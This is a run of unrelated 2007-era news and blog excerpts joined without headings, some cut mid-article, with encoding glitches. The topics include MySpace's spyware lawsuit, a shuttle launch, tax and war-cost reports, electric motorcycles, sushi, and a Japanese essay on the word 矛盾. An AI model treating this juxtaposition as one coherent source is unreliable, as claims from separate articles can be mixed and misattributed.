Fog Cutter continued to pay Wiederhorn a salary of $ 350,000 per month for 18 months while he sat in jail .
Wiederhorn 's wife , Tiffany Wiederhorn , is on the board of directors at MySpace 's parent company Intermix Media .
Intermix Media itself has a tangled history .
In 2004 , Intermix ( then operating as eUniverse ) was named as a spammer organization on USENET .
It purchased ResponseBase , shut down its operations , and reformed it as MySpace .
On April 28 , 2005 , Intermix was sued by the State of New York for installing malicious spyware over the Internet .
According to their press release :
The Attorney General documented at least ten separate web sites from which Intermix or its agents were downloading spyware , providing either no warning or other misleading disclosures .
In this way , Intermix and its agents downloaded more than 3.7 million programs to New Yorkers alone , and tens of millions more to users across the nation .
Intermix also went to great lengths to protect the spyware and adware it secretly installed .
The programs were hidden in unlikely locations on the computer and could not be removed through a computer 's " Add / Remove " function .
In addition , the programs omitted " un-install " applications , and even reinstalled themselves after being deleted .
Just before the adware investigation was announced , Intermix 's primary investors sold $ 25,000,000 worth of Intermix stock at roughly $ 8 per share .
When the attorney general announced the investigation , Intermix stock fell to $ 4 per share .
Intermix 's former CEO , Brad Greenspan , has accused Intermix investors of insider trading .
Soon afterwards , the spyware issue was settled out of court ; Intermix paid $ 7.5 million to the State of New York .
According to The Economist , " As an internet business , MySpace.com considers itself to be an entirely new breed ...
The community has grown virally , with no advertising . "
However , this leaves one crucial question unanswered : without advertising , how did the site become popular in the first place ?

Shuttle Discovery launches
to space with Harmony
BY WILLIAM HARWOOD
STORY WRITTEN FOR CBS NEWS " SPACE PLACE " & USED WITH PERMISSION
Posted : October 23 , 2007
The shuttle Discovery , carrying seven astronauts and a critical connecting module for the international space station , roared to life and rocketed into orbit today , kicking off a high - stakes five - spacewalk mission considered by many the most complex orbital construction work ever attempted .
Credit : Ben Cooper / Spaceflight Now
" I do n't think there 's ever been an astronaut who does n't consider their flight the most dramatic , exciting , complex mission ever , " lead spacewalker Scott Parazynski said before launch .
" But ours is ! "
With its three hydrogen - fueled main engines roaring at full throttle , Discovery 's twin solid - fuel boosters ignited with a rush of fire and thunder at 11:38:19 a.m. , instantly pushing the huge spacecraft away from pad 39A .
Seconds later , Discovery 's flight computers sent commands to the booster steering system , rolling the spacecraft about its vertical axis to put the crew in a heads down orientation as the spaceplane arced out over the Atlantic Ocean on a northeasterly trajectory paralleling the East Coast of the United States .
NASA managers were worried low clouds and rain might delay the launching , but as the morning wore on the anticipated development held off and the crew was cleared for takeoff .
Looking on a few miles away was " Star Wars " creator George Lucas .
A light saber used in the first " Star Wars " movie is on board Discovery to mark the film 's 30th anniversary .
Monitoring the automated ascent from Discovery 's flight deck were Pam Melroy , the second woman to serve as a shuttle commander , Marine Corps pilot George Zamka , flight engineer Stephanie Wilson and Doug Wheelock , an Army helicopter pilot .
Strapped in on the orbiter 's lower deck were physician - astronaut Parazynski , Italian astronaut Paolo Nespoli and Dan Tani , a space station crew member hitching a ride to the lab complex aboard Discovery .
Tani will replace station engineer Clay Anderson , who will return to Earth aboard the shuttle .
Television views from a camera mounted on Discovery 's external fuel tank provided spectacular views of the Florida spaceport dropping away and then the limb of the Earth as the ship headed for orbit .
There were no obvious signs of any major debris falling from the foam - covered tank , but an engineering assessment was not expected until later .

Discovery took off at roughly the moment Earth 's rotation carried the launch pad into the plane of the space station 's orbit .
If all goes well , Melroy will manually guide the shuttle to a linkup with the station around 8:35 a.m. Thursday .
Discovery 's docking and the usual welcome aboard ceremony will have an unusual flavor this time around as Expedition 16 commander Peggy Whitson , the station 's first female commander , welcomes Melroy , probably the final woman to command a shuttle before the program is retired in 2010 .
Both women flew together in 2002 when Whitson served as flight engineer of the fifth station expedition and Melroy visited as pilot of the shuttle Atlantis during mission STS - 112 .
" One of the moments I 'm looking forward to the most is when the hatch opens and I see Peggy 's face on the other side and we reach through for the traditional handshake , " Melroy said in an interview .
" That will be a really special moment for me . "
Whitson said the timing of their flights was a coincidence , " but I do think it is special , not only special just for Pam and I because , you know , we have flown in space before , but the experience of having two women up there at the same time will hopefully be an inspiration to somebody . "
" I was inspired when I was young by the Apollo era astronauts and in particular , I was motivated to become an astronaut when they selected the first female astronauts , " she said .
" I would hope that we could be a role model like that . "
The day after docking , the astronauts will use the station 's robot arm to pull the 31,500 - pound Harmony module from Discovery 's cargo bay as part of the first of the mission 's five spacewalks .
Harmony will be temporarily mounted on the left side of the station 's central Unity module .
After the shuttle departs , Whitson , flight engineer Yuri Malenchenko and Tani will detach the station 's main shuttle docking port , known as pressurized mating adapter No. 2 , mount it on Harmony and then use the station 's robot arm to move both components on the front end of the Destiny laboratory module .
Credit : Chris Miller / Spaceflight Now
Whitson and Tani plan to stage two spacewalks in November to connect Harmony to the station 's cooling system and power grid to clear the way for launch of the European Space Agency 's Columbus research lab aboard the shuttle Atlantis in December .
Columbus will be attached to Harmony 's right - side port while Japan 's Kibo lab module will be connected to Harmony 's left hatch next year .
" Harmony has six different ports that we can add modules onto to build the station , " said Whitson .
" So it 's , it 's our next big connecting piece in our puzzle of putting this huge station together on orbit . "
Attaching a new pressurized module would have been the highlight of many past assembly missions .
But for Discovery 's crew , it is just the beginning .
The second major objective of the flight is the disconnection and relocation of a huge set of solar arrays known as P6 .
Designed as the sixth and final segment of the port , or left , side of the station 's main power truss , P6 was mounted at the center of the station in December 2000 to provide power to the U.S. segment during the initial stages of assembly .
Now , with identical solar panels in place on the left and right sides of the main power truss , NASA needs to move P6 to its permanent position on the far left end of the beam .
The 35,000 - pound segment 's huge arrays , stretching 240 feet from tip to tip , were stowed during shuttle missions last December and June .
Power and cooling lines were disconnected during an August flight , setting the stage for the massive truss 's detachment , relocation and re-extension during Discovery 's mission .
The station 's robot arm cannot reach far enough on its own to make the move .
So the station arm , after handing P6 off to the shuttle 's space crane , will be moved by the station 's mobile transporter to the far end of the power truss .
At that point , the shuttle arm will hand the truss segment back to the station arm and Parazynski and Wheelock , making their third spacewalk by that point , will oversee its attachment to the P5 truss segment .
Credit : Ben Cooper / Spaceflight Now
" Moving the P6 solar array will be a major activity , " Melroy said in a NASA interview .
" On our second spacewalk - our first spacewalk is all about ( Harmony ) - we 'll be using the robotic arm in one location to actually reach around and pull P6 off ... with the assistance of our spacewalkers .
" Once the P6 has been detached from the space station , then the robotic arm will move it around to the port side of the shuttle , at which point it will be handed off to the shuttle arm .
The shuttle robotic arm will take control of the P6 truss while the space station robotic arm is reconfigured and rolled out on the mobile transporter , the mobile platform , all the way to the far end of the port truss .
And then , we 'll use the station arm to take it back and install it in its final location .
" This is pretty nearly the design - limiting case for the robotic arm of the space station , so it 's out at its full extension , trying to get that truss out there , " Melroy said .
" We 'll have the help of the spacewalkers on the third spacewalk to do that .
So , all these activities will actually span three days , three full days , two spacewalks with robotics in the middle . "
Discovery is scheduled to land back at the Kennedy Space Center on Nov. 6 .

BOSTON ( MarketWatch ) --
The U.S. attorney in Brooklyn has started a criminal investigation into a pair of hedge funds run by Bear Stearns Cos. that had positions in mortgage - backed securities and subsequently collapsed last summer , The Wall Street Journal reported .
Federal prosecutors have made a request for information related to the hedge funds , but the probe is in the early stages and has not resulted in any subpoenas , according to a report on the Journal 's Web site .
The report cited people familiar with the matter .
Solar - power electric gets zero emissions
I 'd been riding for years before I learned motorcycles ' dirty little secret .
Mile per mile , some bikes actually spew more gunk into the air than cars , pickup trucks or sport utility vehicles , even if they do use less gas .
It was a sickening realization , because I 'd spent so much time believing the opposite was true .
That 's why the prospect of a performance - oriented electric bike is so appealing .
Of course , an electric motorcycle is n't the same as a zero-emissions motorcycle .
An electric bike 's environmental friendliness depends , for the most part , on where it 's plugged in :
What 's the energy source that 's powering the outlet ?
CHECK CAR PRICES :
Most of the electricity in this country is supplied by coal - fueled plants , so if you 're plugging an electric bike into your outlet , you could say your bike is basically coal - powered .
It 's using less energy , and therefore polluting less than a gas - powered bike , but it 's still using a fossil fuel and it is n't zero-emission .
The idea behind Lightning Motors is to make a bike that 's electric and zero-emission , courtesy of solar power .
Most Americans do n't live " off the grid , " and installing solar panels is n't cheap .
Add the cost of a solar power installation to the price of a motorcycle , and it starts to get a little outrageous .
But that 's short - term thinking .
In the long term , it might make a lot of sense .
Say you 're a commuter , riding a real Yamaha R1 about 80 miles round trip each day .
You 're probably putting $ 8 worth of gas in your tank daily .
That means you 're shelling out about $ 2,000 a year for gas .
By solar expert Richard Hatfield 's math , you 're a quarter of the way toward the cost of a solar - panel installation that would support regular charging of a bike like his R1 conversion , which uses about 8 kilowatts of power to travel 80 miles at an average speed of 65 mph .
Creating 8 kilowatts using solar power would require a 1.2 - kilowatt setup , Hatfield says .
That 's a solar panel roughly the size of two sheets of plywood with an installation cost of about $ 8,000 .
The batteries for the Lightning Lithium we tested are rated for 3,000 charges .
For a daily commuter , that translates into about 10 years of life .
With Hatfield 's solar power scenario , that means the last six years of the batteries ' life are basically free .
At least , that 's the theory .
These batteries are so new that they have n't been tested in the real world to verify the math , but as gas heads toward $ 4 a gallon , it 's an interesting idea to ponder .
The world ’s auto manufacturers produced a record 67 million vehicles in 2006 , putting more cars on the road than ever before , according to a new Vital Signs Update from the Worldwatch Institute .
While global production grew 4 percent last year , China increased its production by nearly 30 percent , overtaking Germany to become the third largest producer .
“ America ’s car addiction is becoming a global phenomenon with no sign of reversing , ” says Worldwatch Senior Researcher Michael Renner , who authored the update .
“ This trend begs immediate and innovative transportation solutions to address the consumption of fossil fuels that is harming our climate . ”
China ’s rise represents the most dramatic change in the world auto industry , with production there more than quintupling in the last decade .
Sales within China surpassed the 3 million mark in 2005 , with nearly 9 million passenger cars on the country ’s roads .
While this is still a comparatively small fleet , it is likely to grow rapidly in coming years , and China is expected to become a major exporter within the next four years .
Traffic congestion , road accidents , air pollution , climate change , and peak oil are all challenges the world faces from car - centered transportation , according to the Institute ’s State of the World 2007 report .
On average , urban car travel uses nearly twice as much energy as urban bus travel .
Despite growing awareness of environmental impacts from burning fossil fuels , consumers have generally been slow to adopt more fuel - efficient vehicles .
However , the rise in oil prices and concerns about climate change in recent years have spurred interest in more efficient vehicles , including low - emission diesels and hybrids .
Toyota , the largest distributor of hybrid gasoline - electric cars , sold 312,500 hybrids in 2006 and expects to sell 430,000 in 2007 .
Dozens of new hybrid vehicle models are under development by Toyota and other companies .
Governments are increasingly eager to regulate fuel economy and carbon dioxide emissions .
In the late 1990s , car manufacturers selling to the European Union voluntarily agreed to reduce carbon emissions to 140 grams per kilometer by 2008 , but they have not yet come close to meeting this target .
In response , the EU decided to impose mandatory limits requiring further cuts to 130 grams per kilometer .
Meanwhile , California sued six of the world ’s largest automakers over climate change , charging that greenhouse gases from their vehicles have caused billions of dollars in damages .
China ’s first national mandatory fuel economy standards went into force in July 2005 , and a more stringent second phase will be introduced in January 2008 .
In the United States , where the 2006 model year included the heaviest vehicles in three decades , the Senate passed an energy bill last month that includes an increase in average fuel economy from 25 to 35 miles per gallon for cars , SUVs , and pickup trucks by 2020 .
“ With more cars on the road year after year , regulating auto fuel consumption and emissions alone is not a solution .
What is truly needed is a transportation revolution , ” says Renner .
“ Cities from BogotÃ¡ to London are decreasing their dependence on cars , and many more cities could follow their example .
We need denser cities with better land - use practices and a commitment to public transportation . ”
Innovative transportation solutions , such as bus rapid transit and light rail , are already helping to green urban transportation , according to State of the World 2007 .

Rich state , poor state
“ Andrew Gelman ” : http://www.stat.columbia.edu/~cook/movabletype/archives/2007/10/some_cool_graph.html and his co-authors build on results from a “ recent paper ” : http://www.stat.columbia.edu/~gelman/research/published/red_state_blue_state_revised.pdf to draw some fascinating maps of what the 2004 presidential elections would have looked like if only ( 1 ) poor , ( 2 ) middle income , or ( 3 ) rich people had been able to vote .
These maps show some obvious class differences ( as well as illustrating the importance of poor voters to Democratic electoral prospects ) , but also suggest ( as does the paper ) some interesting relationships between how people at different income levels vote in rich and poor states .
For poor voters , there is no systematic difference between rich and poor states .
But for middle - income and especially for rich voters , there is a very strong pattern of rich states supporting the Democrats and poor states supporting the Republicans .
In short , rich people and poor people who live in poor states have very different voting preferences from each other .
Rich people and poor people who live in rich states have much more similar voting preferences .
Gelman et al. do n’t have any hard and fast explanation for this ( they note that race explains about half of this disparity , but only half ) .
However , their results do suggest that some of the conventional wisdom of American journalists on class , voting and geographic location stands in sore need of revisiting .

Censorship in Google Sky ?
See new Sky Forum Someone has found a blacked out area in the new Google Earth Sky ( viewable with the new GE 4.2 – download here ) where stars should be shown .
This find was posted by ‘ ZhingHong ’ in the new GE Sky Forum at the Google Earth Community .
My theory is that an alien government has forced Google to censor this area in order to hide their secret planetary systems with giant palaces built with money stolen from taxes of their unwitting alien citizens .
🙂
Someone else posted that the black square is the giant black monolith from “ 2001 : A Space Odessey “ .
Another amusing find : ‘ Jeffryv’ “ found ” the Starship Enterprise About Frank Taylor Frank Taylor started the Google Earth Blog in July , 2005 shortly after Google Earth was first released .
He has worked with 3D computer graphics and VR for many years and was very impressed with this exciting product .

Working on social software , I 've been thinking about the dynamics around walled gardens recently .
There is a strong tendency for Web applications that benefit from network effects to metamorphosize into walled gardens .
Unfortunately , I have n't found a definition of " walled garden " that I like .
Most references to " walled gardens " in the context of internet services refers to ISPs creating their own closed network which is " pay to play " for publishers as opposed to giving their users access to the World Wide Web .
The most popular examples of this are AOL of old and most recently mobile phone carriers .
However this definition does n't really capture the new way in which users are being tied to a particular vendors vision of the Web , thanks to the power of network effects .
In his post Facebook vs. AOL , redux Jason Kottke writes
I wanted to clarify my comments about Facebook 's similarities to AOL .
I do n't think Facebook is a bad company or that they wo n't be successful ; they seem like smart passionate people who genuinely care about making a great space for their users .
1
It 's just that I , unlike many other people , do n't think that Facebook and Facebook Platform are the future of the web .
The platform is great for Facebook , but it 's a step sideways or even backwards ( towards an AOL - style service ) for the web .
Think of it this way .
Facebook is an intranet for you and your friends that just happens to be accessible without a VPN .
If you 're not a Facebook user , you can't do anything with the site ... nearly everything published by their users is private .
Google does n't index any user - created information on Facebook .
2 ... Compare this with MySpace or Flickr or YouTube .
Much of the information generated on these sites is publicly available .
The pages are indexed by search engines .
You do n't have to be a user to participate
...
Everything you can do on Facebook with ease is possible using a loose coalition of blogging software , IM clients , email , Twitter , Flickr , Google Reader , etc .
In his post Avoiding Walled Gardens on the Internet Jeff Atwood writes
I occasionally get requests to join private social networking sites , like LinkedIn or Facebook .
I always politely decline .
I understand the appeal of private social networking , and I mean no disrespect to the people who send invites .
But it 's just not for me .
I feel very strongly that we already have the world 's best public social networking tool right in front of us : it 's called the internet .
Public services on the web , such as blogs , twitter , flickr , and so forth , are what we should invest our time in .
And because it 's public , we can leverage the immense power of internet search to tie it all -- and each other -- together .
In comparison , adding content to a private , walled garden on the internet smacks of the old - world America Online ideology :
Jason and Jeff are both smart guys but they think like geeks .
To me it seems pretty obvious why the average person would want to to use one application for managing photos , blogging , IM , reading feeds with updates from their friends , etc instead if using half a dozen products .
Especially if the one product fosters a sense of community better than any of the other individual products does on its own .
Of course , I 've said this all before in my post Why Facebook is Bigger than Blogging so I wo n't repeat myself here .
What I do find interesting is trying to define what makes Facebook a " walled garden " .
Jeff and Jason seems to think it primarily hinges on the content produced on the site being visible to search engines .
This belief seems fairly widespread since I 've also seen mentions of it on blog posts by Steve Rubel and danah boyd .
This definition does n't sit right with me .
I actually think it 's a good thing that the drunk frat party pics , emotional public break ups and experimentation with new ideas that make up the average high schooler or college students life ( i.e. the primary demographic of social networks ) should n't out there for search engines to index , cache and then keep around forever .
From the perspective of Jeff and Jason it seems the problem with walled gardens is that people outside the garden can't see it 's beauty , from my perspective the problem is that they surround their users with beauty to disguise the fact that they are trapped ( or should I say locked in ? ) .
Thus I actually think of " walled gardens " as services that limit users .
This is the difference between being able to send email to anyone on the internet and only being able to send mail to send email to people who use the same ISP .
It 's the difference between being able to send instant messages to anyone who uses an IM client instead of just to people who use the same IM service or use a product that has " paid to play " in your IM network .
It 's the difference between being able to accept any payment on your online auction ( e.g. Google Checkout ) and being told you can only use that provided by the the owner of the marketplace ( e.g. Paypal ) .
When you look at things from that perspective , there are more walled gardens on the Web than people would care to admit .
Why this is the case is eloquently explained in this comment by leoc on reddit which is excerpted below
Certainly it 's not simple , but that 's why it would be the " next Web " rather than what we have now .
It seems there are two big forces creating the Web 2.0 social - site bottleneck .
One is the fact that hosting is fiddly and expensive .
It 's certainly better than it was , but it 's still the preserve of nerds and professionals .
( El - cheapo PHP4 hosting is almost cheap enough but too fiddly and much too limited ; virtual hosting and up is flexible but much too fiddly and expensive . )
We need a future where the casual user can drag - n - drop fairly arbitrary programs and documents into his own webspace without having to worry too much about configurations or Digg - storms or bandwidth fees .
The other is that centrally - controlled databases are the low - hanging fruit ; it 's much harder to create decentralised systems that work .
It 's much easier for Amazon to have users log in and enter their book reviews in Amazon 's database than it would be for you to find and aggregate all the reviews for a given book from the Web , then reputation / spam - filter them and present them in some kind of coherent framework .
( And that 's assuming that people would rather put reviews in their own webspace rather than just typing into an Amazon textarea - problem one again . )
Similarly , the classic wiki model is inherently centralised
In today 's world , it is far easier and cheaper for the average Web user to use a centralized hosted service than utilize a service on their own Web space even if they can get the software for free .
In addition , a lot of software on the Web especially social software applications benefit from network effects so once a service hits a certain critical mass , displacing it is a losing proposition whether it is an online auction market or the # 1 instant messaging application .
When you put these things together you get a world where the dominant software in certain categories tends towards a monopoly or at the very least conforms to a Power law distribution .
And once a product gets to that point , it is easy to think in terms of preserving marketshare as opposed to giving users choice .
At that point , another walled garden has been created .

Secret spy court orders Bush to respond to request for information on secret ruling RAW STORY

In an unprecedented order , the Foreign Intelligence Surveillance Court ordered the Bush Administration to respond to a request it received last week by the American Civil Liberties Union for orders and legal papers discussing the scope of the government 's authority to engage in the secret wiretapping of Americans , according to an ACLU press release late Friday .
The release follows .
According to the FISCs order , the ACLUs request warrants further briefing ,  and the government must respond to it by August 31 .
The court has said that any reply by the ACLU must be filed by September 14 .
" Disclosure of these court orders and legal papers is essential to the ongoing debate about government surveillance , " said Anthony D. Romero , Executive Director of the ACLU .
" We desperately need greater transparency and public scrutiny .
We 're extremely encouraged by today 's development because it means that , at long last , the government will be required to defend its contention that the orders should not be released . "
The ACLU filed the request with the FISC following Congress ' recent passage of the so - called " Protect America Act , " a law that vastly expands the Bush administration 's authority to conduct warrantless wiretapping of Americans ' international phone calls and e-mails .
In their aggressive push to justify passing this ill - advised legislation , the administration and members of Congress made repeated and veiled references to orders issued by the FISC earlier this year .
The legislation is set to expire in six months unless it is renewed .
 These court orders relate to the circumstances in which the government should be permitted to use its profoundly intrusive surveillance powers to intercept the communications of U.S. citizens and residents ,  said Jameel Jaffer , Director of the ACLUs National Security Project .
 The debate about this issue should not take place in a vacuum .
It s imperative that the public have access to basic information about what the administration has proposed and what the intelligence court has authorized .
FISC orders have played a critical role in the evolution of the government 's surveillance activities over the past six years .
After September 11 , President Bush authorized the National Security Agency ( NSA ) to inaugurate a program of warrantless wiretapping inside the United States .
In January 2007 , however , just days before an appeals court was to hear the government 's appeal from a judicial ruling that had found the NSA program to be illegal in a case brought by the ACLU , Attorney General Gonzales announced that the NSA program would be discontinued .
Gonzales explained that the change was made possible by FISC orders issued on January 10 , 2007 , which he characterized as " complex " and " innovative . "
Those orders are among the documents requested by the ACLU .
Since January 2007 , government officials have spoken publicly about the January 10 orders in congressional testimony , to the media and in legal papers - the orders remaining secret all the while .
They have also indicated that the FISC issued other orders in the spring that restricted the administration 's surveillance activities .
House Minority Leader John Boehner stated that the FISC had issued a ruling prohibiting intelligence agents from intercepting foreign - to - foreign calls passing through the United States .
To a large extent , it was the perception that the FISC had issued an order limiting the administration 's surveillance authority that led Congress to pass the new legislation expanding the governments surveillance powers .
Yet the order itself , like the January 2007 order , has remained secret .
The ACLU 's request to the FISC acknowledges that the FISC 's docket includes a significant amount of material that is properly classified .
The ACLU argues , however , that the release of court orders and opinions would not raise any security concern to the extent that these records address purely legal issues about the scope of the government 's wiretap authority , and points out that the FISC has released such orders and opinions before .
The ACLU is seeking release of all information in those judicial orders and legal papers the court determines , after independent review , to be unclassified or improperly classified .
A copy of the FISA court order , the ACLU 's motion to the FISC , as well as information about the ACLU 's lawsuit against the NSA and other related materials are available online at : www.aclu.org/spying.
In addition to Jaffer , lawyers on the case are Steven R. Shapiro , Melissa Goodman , and Alexa Kolbi-Molinas of the ACLU and Art Spitzer of the ACLU of the National Capital Area .

Democrats ' tax plan :
Cut corporate tax by 5 percent , hike taxes 4 percent on families earning $ 200,000 or more RAW STORY
Published : Thursday October 25 , 2007
del.icio.us
Print This Email This The House 's top Democratic tax writer on Thursday unveiled a $ 1 trillion plan to repeal the alternative minimum tax and lower the tax burden of most lower - and middle - income people .
But his proposal would also cut the top corporate tax rate from 35 % to 30.5 % .
In laying out the plan that would effectively rewrite many of the tax policies put in place under Republican control of Congress , Rep. Charles Rangel ( D - NY ) said the changes would bring a net tax reduction to almost all families with incomes under $ 500,000 and that some 91 million families would receive tax relief .
The package , introduced by the Ways and Means Committee chairman at a news conference , includes a one - year temporary fix to shield middle - income families who might get hit by the alternative minimum tax and several dozen extensions of specific tax credits now available to teachers , veterans , those with education expenses and others .
The more far - reaching changes in the tax code will probably not come up for a vote in the House until next year , but Democratic leaders have indicated they will move quickly on the stopgap AMT measure and the extensions .
Republicans quickly voiced strong opposition to the long - term plan .
" This is the largest individual income tax increase in history , " Rep. Jim McCrery of Louisiana , Rangel 's low - key GOP counterpart on the committee , wrote fellow Republicans .
Rangel , he said , " is selling pure snake oil . "
Republicans in recent days have prodded Democrats to act on the AMT issue .
Treasury Secretary Henry Paulson on Tuesday warned in a letter to Congress that failure to pass an AMT fix soon would expose 21 million taxpayers to the tax , with an average tax increase of $ 2,000 .
The AMT was created in 1969 to ensure that a very small number of wealthy people could n't use tax breaks or deductions to eliminate their entire tax liability .
But the tax was not indexed to inflation , and every year more people are exposed to it .
Nearly 4 million taxpayers were subject to the AMT in 2006 , and the number is expected to multiply in 2007 .
The Rangel proposal would extend for one year the current - law AMT relief for nonrefundable personal credits , at an estimated cost of $ 47 billion over 10 years .
The permanent repeal of the tax would cost nearly $ 800 billion over 10 years .
That would be offset by applying a replacement tax of 4 percent of married couple income above a certain level , not to be less than $ 200,000 .
The tax would be 4.6 percent on income in excess of $ 500,000 , or $ 250,000 in the case of a single taxpayer .
High - income individuals would see a limitation on itemized deductions and a phase - out of deductions for personal exemptions , raising $ 29 billion over 10 years .

News in Brief
NASA / JOHNS HOPKINS UNIV ./ SOUTHWEST RES .
INST .
Astronomers have witnessed a spectacular eruption on Io , the fiery moon of Jupiter .
NASA 's New Horizons probe snapped pictures ( right ) of a volcanic plume 350 kilometres high — 40 times the height of Mount Everest — when the probe passed by Jupiter in February and March on its way to Pluto .
Results from the fly - by were presented at the annual meeting of the American Astronomical Society 's Division for Planetary Sciences on 9 October in Florida , and also appear as papers in the 12 October issue of Science .
Scientists were surprised to find that Jupiter 's weather was abnormally quiescent .
But Io — kneaded by Jupiter 's gravity into constant volcanic upheaval — did n't disappoint .
Scientists took 39 pictures of the Tvashtar volcano over 8 days , as an orange , sulphur - rich plume rocketed out at speeds up to 700 metres per second .
Omakase Sushi
I ’ve had a number of questions about omakase meals in a sushi restaurant and thought to take this time to explain what true omakase is to those unfamiliar with the term , or who just want to know more .
Omakase literally means entrust and basically means “ chef ’s choice . ”
The Itamae ( sushi chef ) is given the opportunity to select what he will serve you for that meal , and since this commands a higher price usually than one would expect , the quality of the meal ( food and presentation ) and his attentiveness should make it worth your while .
This is not your average meal , and it should leave you satisfied , still interested , and encouraged .
The first thing to realize is that there is omakase and there is Omakase .
By that I mean in many areas , omakase has begun to become popular and the concept has become a diluted experience due to less experienced restaurants jumping on the bandwagon .
True omakase should result in careful attention by the Itamae , a great selection of the freshest fish , seasonal items that you might not normally even encounter and a presentation far beyond what you would ever see just ordering a few pieces of sushi .
You might be used to your yellowtail ( hamachi ) in a roll with scallions , or as sushi , but have you ever had it cubed and served with a raw quail egg and tobiko ?
I have seen plenty of omakase platters with new and interesting presentations , as well as unique combinations .
However in some cases , where lesser understanding results in a lower quality experience , what you may end up with is a bunch of sushi items that someone else chose on a plate , perhaps still tasty , but is not that dissimilar to what you normally see in an average order .
In bad sushi restaurants it could be a great way for the Itamae hand of items that he may want to be rid of .
Stick to respectable places and you wo n’t have to worry about that .
With true omakase , the Itamae should be attentive to you and not just hand you a plate and wander off .
Traditional omakase is also not based on a particular budget , it can be a costly adventure but well worth it if the Itamae is highly skilled .
Some feel that it is best to not have omakase at a place where the Itamae does not know your likes and dislikes , however I feel that the true reason for omakase is to be able to experience the best items that are available at that time , and in that case , knowing you is irrelevant since it is more about what is best at that moment than what you like .
If you only like California rolls and spicy tuna , omakase is something you might want to skip .
However it is also a great way to discover new sushi items that you may have overlooked or never thought to try .
If you are new to omakase , you might want to keep in mind what to expect from your meal .
You must be prepared to eat things that you may have never wanted to try or look like something you may never want to .
Generally , it is not considered polite to leave food on your plate , but then again , no one is holding a gun to your head .
On the other hand , it is not impolite to say to the Itamae something like “ Omakase , please , but no mackerel . ”
You can choose to not have sashimi , no sushi , or both if you would like .
Making requests is all part of the Itamae being attentive to you .
In general , it is best to order omakase at a restaurant that you know .
Or one that is well known to serve excellent omakase .
This serving style can be easily found , but to expect great omakase in a standard sushi place would be a mistake .
It is easy to find good sushi , but omakase takes the experience to a whole new level .
It takes years of experience , deep knowledge of the food , and devotion to creating the best meal for the customer that makes omakase great .
Anything else is simply someone else ’s order .
BTW … Love sushi ?

Iraq , Afghanistan wars twice as expensive as expected , report says Nick Juliano
Published : Tuesday November 13 , 2007
del.icio.us
Print This Email This ' Hidden costs ' behind skyrocketing price of war President Bush 's six - year invasion of Afghanistan and Iraq will end up costing Americans about $ 1.5 trillion , or nearly twice as much as the White House has actually spent to fight its wars , because of unseen costs like inflation , rising oil prices and expensive care for wounded veterans .
The estimate was revealed in a Democratic staff report from Congress 's Joint Economic Committee .
The staff report , titled " The Hidden Costs of the Iraq War , " estimates that the Iraq and Afghan wars have cost the average family more than $ 20,000 .
" The full economic costs of the war to the American taxpayers and the overall U.S. economy go well beyond even the immense federal budget costs already reported , " said the report , which was obtained by the Washington Post .
The White House apparently has vastly underestimated the war 's costs .
It requested $ 804 billion -- just more than half the total costs -- to keep up its wars and occupations through 2008 .
" The report argues that war funding is diverting billions of dollars away from " productive investment " by American businesses in the United States .
It also says that the conflicts are pulling reservists and National Guardsmen away from their jobs , resulting in economic disruptions for U.S. employers that the report estimates at $ 1 billion to $ 2 billion , " reports the Post 's Josh White .
Furthermore , the report takes into account the massive healthcare costs for injured veterans and the declining economic productivity of vets who return home seriously injured .
It also takes into account the massive interest the US will have to pay on the borrowed money that is funding the war .
Republicans took issue with the Democratic staff report .
" We 'll see what they come up with , but it sure seems that the Senate leadership is trying to protect their continual proclamations of defeat instead of working for bipartisan progress , " a spokesman for Sen. Sam Brownback ( R - KS ) , the top GOP member of the joint panel , told White .
Some of the report 's estimates need to be taken with a grain of salt , experts warn , because it is difficult to ascribe factors like increasing oil prices to the war in Iraq alone .
The report finds that skyrocketing oil prices -- which tripled since 2003 to surpass $ 90 per barrel recently -- cannot be blamed solely on the war in Iraq , but declining production from Iraq 's ravaged oil fields have likely caused the price to tick up " between $ 4 and $ 5 a barrel . "
The Democratic staff on the Joint Economic Committee -- which includes bipartisan representatives from the House and Senate -- is hardly the first to try to sum up the true costs of the war .
Harvard University economist Joseph Stiglitz last year attempted a similar study that would take into account outside costs of war -- such as long - term care for the thousands of US troops injured on the battlefield .
He estimated a total cost as high as $ 2 trillion for the war in Iraq alone .
The Post spoke to Robert D. Hormats , vice chairman of Goldman Sachs and a former National Security Council staffer under Presidents Nixon , Ford and Carter .
Hormats took issue with the specificity of some of the Democratic report 's findings , but he said President Bush has taken greatly differed from his predecessors when it comes to funding the war .
" The wars will cost a lot more than the appropriated sums , and it 's certainly true our children will be paying for this for a long , long time , " he told the paper .
" I 'm very critical of the way they have financed the war , but I always hesitate to try to quantify any of these things , to make these numerical judgments . "

詭弁 （ きべん ） をろうして 、 「 盾と矛を売る楚の人」を何とか弁護する。
初めに
「 矛盾 （ むじゅん ） 」というのは 「 言っていることがおかしい。一方では○○と言っているのに、同時に○○ではない、と言っている」という意味ですが、
この 「矛盾」という言葉は、ご存じのかたも多いと思いますが、「
矛 （ ほこ ） 」と 「 盾 （ たて ） 」が出てくる古い話が語源だそうです （今でいう中国の古い話。漢文の授業とかで習うかも…）。
「 矛」 は 「 矛先 （ ほこさき ） 」という言葉からも分かるでしょうが、突き刺す武器です。ヤリです。
「 盾つきやがって」とかいうフレーズにも登場する「盾」は、攻撃の防御に使う板みたいなやつ。
どういう話かというと、 楚 （ そ ） という国の商人 が
「 さあ、買った買った、何でも突き通す鋭い矛だよ！」
「 さあ、買った買った、何を使っても貫けない堅い盾だよ！」
などと大げさな宣伝をしているところに、うるさい客が来て、
「 あなたの矛であなたの盾を突くと、どうなるのですか」
楚の人は答えられなかった。そして、このエピソードから今でいう「矛盾」という言葉が生まれた…ということなのですが、
以下は 詭弁 （ きべん ） をろうして（相手を煙に巻くような変な理屈をこねて）この楚の人を何とか弁護できないか、 ということを考えたものです 。
もちろん、楚の人が言っていることは文字通り矛盾しているので、正攻法では弁護のしようがなく、
以下はすべてへりくつのようなものです。そのへりくつを楽しもう、というのがテーマです。
形式論理学、物理学、哲学、ジョーク、文学、など、さまざまなアプローチから、へりくつをこねます。
へりくつ 集
質問 「あなたの矛であなたの盾を突くとどうなるのですか」
現時点での最善の答え 「お買いあげになれば分かります」→要するに売るための宣伝文句なのだから、何はともあれ売ってしまえばこちらの勝ち。
楚の人は決して「答えられない」ということはない。口べただっただけ。この故事の意味は、 商売人は口達者であるべしという教訓である。
「 さあ、買った買った、何でも突き通す鋭い矛だよ！」
「 さあ、買った買った、何を使っても貫けない堅い盾だよ！」
